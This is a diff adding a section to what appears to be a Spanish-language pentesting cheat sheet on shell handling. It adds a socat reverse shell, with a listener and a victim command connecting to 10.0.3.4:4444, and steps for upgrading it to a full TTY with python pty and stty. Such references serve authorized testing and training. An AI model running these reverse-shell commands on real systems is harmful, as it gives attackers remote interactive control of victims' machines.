@@ -1325,6 +1325,30 @@ Este argumento lo que hace es permitir al usuario definir una accion que ejecuta
 * echo os.system\('/bin/bash'\)
 * /bin/sh -i
 
+* Socat
+
+_Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+_Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444_
+
+* Stty
+
+In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+In Kali
+$ stty raw -echo
+$ fg
+
+In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+
 ### Port forwarded SSH
 
 * ssh -\[L/R\] \[local port\]:\[remote ip\]:\[remote port\] \[local user\]@\[local ip\]
